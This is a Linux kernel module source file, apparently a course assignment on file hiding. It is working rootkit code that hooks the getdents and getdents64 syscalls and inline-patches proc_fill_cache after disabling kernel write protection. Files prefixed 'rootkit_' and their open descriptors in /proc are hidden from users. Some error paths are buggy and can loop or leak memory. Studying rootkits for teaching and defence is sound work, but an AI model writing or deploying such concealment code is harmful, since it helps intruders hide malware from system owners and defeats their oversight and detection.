/*
 *  Assignment 4
 *  File Hiding
 *
 *  Requirements:
 *     a) Pick a suitable prefix (for instance rootkit_). Hide files with this
 *         predefined prefix from the user when listing directories
 *     b) Hide the opened file descriptors that point to a hidden file from /proc/<pid>/
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/delay.h>
#include <linux/reboot.h>
#include <linux/moduleparam.h>
#include <linux/fs.h>
#include <linux/pid_namespace.h>
#include <linux/ptrace.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <asm/paravirt.h>
#include "sysmap.h"
#include "proc_internal.h"

struct linux_dirent {
  unsigned long   d_ino;
  unsigned long   d_off;
  unsigned short  d_reclen;
  char            d_name[1];
};

#define syscalls ((void**)SM_sys_call_table)

atomic_t active_calls = ATOMIC_INIT(0);

#define HIDE_PREFIX "rootkit_"

void disable_ro(void)
{
    write_cr0(read_cr0() & ~X86_CR0_WP);
    barrier();
}

void enable_ro(void)
{
    write_cr0(read_cr0() | X86_CR0_WP);
    barrier();
}


/* file hiding */
asmlinkage int (*real_getdents)(unsigned int, struct linux_dirent*, unsigned int);
asmlinkage int (*real_getdents64)(unsigned int, struct linux_dirent64 *, unsigned int);

int shall_hide(char *file_name)
{
  char *file_name_tmp = file_name;
  const char *prefix_tmp = HIDE_PREFIX;

  while (*prefix_tmp != '\0') {
    if (*file_name_tmp == '\0' || *file_name_tmp != *prefix_tmp) {
      return 0;
    }
    ++file_name_tmp;
    ++prefix_tmp;
  }
  return 1;
}

asmlinkage int fake_getdents64( unsigned int fd,
                                struct linux_dirent64 *dirp,
                                unsigned int count )
{
  int ret;
  struct linux_dirent64 *cur = dirp;
  int pos = 0;

  ret = real_getdents64 (fd, dirp, count);

  while (pos < ret) {

    if (shall_hide(cur->d_name)) {
      int err;
      int reclen = cur->d_reclen;
      char *next_rec = (char*)cur + reclen;
      uintptr_t len = (uintptr_t)dirp + ret - (uintptr_t)next_rec;
      char *remaining_dirents = kmalloc(len, GFP_KERNEL);

      // modify the memory storing the returned information
      err = copy_from_user(remaining_dirents, next_rec, len);
      if (err) {
        continue;
      }
      err = copy_to_user(cur, remaining_dirents, len);
      if (err) {
        continue;
      }
      kfree(remaining_dirents);
      // Adjust the return value;
      ret -= reclen;
      continue;
    }
    // Get the next dirent
    pos += cur->d_reclen;
    cur = (struct linux_dirent64*) ((char*)dirp + pos);
  }
  return ret;
}

asmlinkage int fake_getdents(  unsigned int fd,
                               struct linux_dirent*dirp,
                               unsigned int count )
{
  int ret;
  struct linux_dirent* cur = dirp;
  int pos = 0;

  ret = real_getdents(fd, dirp, count);
  while (pos < ret) {

    if (shall_hide(cur->d_name)) {
      int reclen = cur->d_reclen;
      char* next_rec = (char*)cur + reclen;
      uintptr_t len = (uintptr_t)dirp + ret - (uintptr_t)next_rec;
      memmove(cur, next_rec, len);
      ret -= reclen;
      continue;
    }
    pos += cur->d_reclen;
    cur = (struct linux_dirent*) ((char*)dirp + pos);
  }
  return ret;
}

bool fake__proc_fill_cache( struct file *file,
                            struct dir_context *ctx,
                            const char *name,
                            int len,
                            instantiate_t instantiate,
                            struct task_struct *task,
                            const void *ptr )
{
    struct dentry *child, *dir = file->f_path.dentry;
    struct qstr qname = QSTR_INIT(name, len);
    struct inode *inode;
    unsigned type;
    ino_t ino;
    bool ret, trigger = false, kill = false;
    char textbuf[32];
    struct path path;
    char* tmp, * pathname;

    atomic_inc(&active_calls);

    snprintf(textbuf, sizeof(textbuf), "%d", (int)(long long)ptr);
    if ((strcmp(name, textbuf) == 0))
    {
        trigger = true;
    }

    child = d_hash_and_lookup(dir, &qname);
    if (!child) {
        child = d_alloc(dir, &qname);
        if (!child)
            goto end_instantiate;
        if (instantiate(d_inode(dir), child, task, ptr) < 0) {
            dput(child);
            goto end_instantiate;
        }
    }

    if (trigger)
    {
        if (PROC_I(d_inode(child))->op.proc_get_link(child, &path)) printk(KERN_INFO "bugbugbug\n");
        else
        {
            tmp = (char*)__get_free_page(GFP_TEMPORARY);
            if (tmp)
            {
                pathname = d_path(&path, tmp, PAGE_SIZE - 1);
                if (!IS_ERR(pathname))
                {
                    tmp[PAGE_SIZE - 1] = '\0';
                    if (strstr(pathname, "/" HIDE_PREFIX))
                    {
                        kill = true;
                    }
                }

                free_page((unsigned long)tmp);
            }
        }
    }

    inode = d_inode(child);
    ino = inode->i_ino;
    type = inode->i_mode >> 12;
    dput(child);
    ret = kill ? true : dir_emit(ctx, name, len, ino, type);
    goto gtfo;

end_instantiate:
    ret = dir_emit(ctx, name, len, 1, DT_UNKNOWN);

gtfo:
    atomic_dec(&active_calls);
    return ret;
}

uint8_t func_backup[12];

void hook(void)
{
    uint8_t* p;

    disable_ro();
    p = (uint8_t*)SM_proc_fill_cache;
    memcpy(func_backup, p, sizeof(func_backup));
    p[0] = 0x48;
    p[1] = 0xb8;
    *(void**)(p + 2) = fake__proc_fill_cache;
    p[10] = 0xff;
    p[11] = 0xe0;

    real_getdents             = syscalls[__NR_getdents];
    real_getdents64           = syscalls[__NR_getdents64];
    syscalls[__NR_getdents]   = fake_getdents;
    syscalls[__NR_getdents64] = fake_getdents64;

    enable_ro();
}

void unhook(void)
{
    disable_ro();
    memcpy(SM_proc_fill_cache, func_backup, sizeof(func_backup));

    syscalls[__NR_getdents]   = real_getdents;
    syscalls[__NR_getdents64] = real_getdents64;

    enable_ro();
}

int init_module(void){
    printk(KERN_INFO "File_hiding loaded.\n");

    hook();

    return 0;
}

void cleanup_module(void){
    printk(KERN_INFO "File_hiding unloaded.\n");

    unhook();
    // Prevent other CPUs from crashing due to running unloaded code
    // Not too pretty but should be fine
    while (atomic_read(&active_calls) != 0)
        msleep(100);

    return;
}

